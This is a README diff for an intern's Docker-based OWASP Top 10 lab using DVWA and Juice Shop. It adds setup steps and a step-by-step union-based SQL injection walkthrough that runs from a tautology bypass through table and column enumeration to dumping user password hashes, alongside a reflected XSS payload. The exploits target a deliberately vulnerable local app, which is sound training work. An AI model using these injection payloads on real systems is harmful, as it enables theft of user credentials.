@@ -1,63 +1,89 @@
-🕸️ Web Application Security Lab (OWASP Top 10)
-This project is a dedicated security research environment built during my Cyber Security internship at Next Afield. The goal is to systematically identify, exploit, and remediate vulnerabilities listed in the OWASP Top 10
+# 🛡️ Web Application Security Lab (OWASP Top 10)
+This repository is a comprehensive guide to setting up a professional security research environment. It is part of my Cyber Security internship at Next Afield. The project focuses on identifying, exploiting, and fixing the OWASP Top 10 vulnerabilities.
 
 
-🛠️ Infrastructure & Setup
-The lab is fully containerized using Docker to ensure process isolation and a safe testing environment.
+### 🚀 Phase 1: Environment Setup (For Beginners)
+If you are new to this, follow these exact steps to get your hacking lab running in minutes.
 
+  1. Install Prerequisites
+--> Before running the lab, make sure you have the following installed:
 
-📦 Applications Included:
-DVWA (Damn Vulnerable Web App): PHP/MySQL based lab for core vulnerability testing.
-OWASP Juice Shop: A modern Node.js application for complex security scenarios.
-WebGoat: A deliberate insecure application for Java-based security lessons.
+--> Docker Desktop: Download [Docker Desktop](https://www.docker.com/products/docker-desktop/) here (Essential for running the lab containers).
 
+--> Git: (Optional, to clone this repository).
 
-🚀 Deployment Instructions
-Ensure Docker Desktop is running on your host machine.
-Clone this repository and navigate to this directory.
-Deploy the lab using:
+  2. Create the Lab Configuration
+--> Create a new folder on your computer (e.g., C:\MySecurityLab).
 
-```bash
-docker-compose up -d
-```
-Access the labs via browser:
-DVWA: 
-``` http://localhost:8081 ```
-(Default Creds: admin / password)
-Juice Shop:``` http://localhost:3000  ```
+--> Inside that folder, create a file named docker-compose.yml.
 
+--> Copy the code from the docker-compose.yml file in this repository and paste it into your file.
 
+  3. Launch the Lab
+--> Open Command Prompt (CMD) or PowerShell.
 
-🔍 Vulnerabilities Reproduced (Proof of Concept)
-1. SQL Injection (SQLi)
-Vector: User ID input field.
+--> Navigate to your folder: ```cd path/to/your/folder```
 
-Payload: ' OR '1'='1
-
-Description: By injecting a tautology, the backend SQL query was manipulated to return all records from the users table, bypassing individual ID lookup.
-
-Status: ✅ Successfully exploited.
+--> Run the command to start all security tools: ```docker-compose up -d```
 
 
 
-2. Cross-Site Scripting (XSS) - Reflected
-Vector: Name input field.
-Payload: ```<script>alert("Hacked by Bharat")</script>```
+### 📦 Phase 2: Accessing the Applications
 
-Description: Malicious JavaScript was successfully executed in the context of the user's session because the application failed to sanitize user input before rendering it on the page.
+Once the containers are running, open your browser and visit:
+
+| Application | URL | Default Credentials |
+| :--- | :--- | :--- |
+| **DVWA** | `http://localhost:8081` | `admin` / `password` |
+| **OWASP Juice Shop** | `http://localhost:3000` | N/A (Self-Registration) |
 
 
+Important: After logging into DVWA for the first time, go to the "Setup / Reset DB" tab and click "Create / Reset Database" to initialize the lab.
 
-Status: ✅ Successfully exploited.
-📝 Deliverables Checklist (Internship Progress)
-[x] Docker-based Lab Setup
+### 🔍 Phase 3: Vulnerabilities & Proof of Concept (PoC)
 
-[x] SQLi Lab Reproduction & Documentation
+🛠️ 1. SQL Injection (SQLi) - Deep Dive
+Objective: Identify backend database structure and extract sensitive user data.
 
-[x] XSS Lab Reproduction & Documentation
+Target: User ID input field in DVWA (Security Level: Low).
 
-[ ] Burp Suite Interception Logs
+Step-by-Step Exploitation:
+A. Authentication Bypass (Tautology)
 
-[ ] Secure Code Remediation (Before/After)
+Payload: ```' OR '1'='1```
 
-[ ] Final Security Assessment Report
+Purpose: To force the database to return all records by making the WHERE clause always true.
+
+Result: Successfully bypassed ID lookup to list all registered users.
+
+B. Database Metadata Extraction (Union-Based)
+
+Payload: ```' UNION SELECT database(), version() #```
+
+Purpose: To identify the active database name and the server version.
+
+Result: Identified Database: dvwa | Version: 10.4.32-MariaDB.
+
+C. Table Enumeration
+
+Payload: ```' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = 'dvwa' #```
+
+Purpose: To list all tables existing within the identified database.
+
+Result: Discovered critical tables: users and guestbook.
+
+D. Column Enumeration
+
+Payload: ```' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'users' #```
+
+Purpose: To find the names of columns (like usernames/passwords) inside the users table.
+
+Result: Identified sensitive columns: user, password, user_id.
+
+E. Full Data Extraction (The Dump)
+
+Payload: ```' UNION SELECT user, password FROM users #```
+
+Purpose: To extract the actual credentials of all users from the database.
+
+Result: Successfully dumped all usernames and their corresponding hashed passwords.
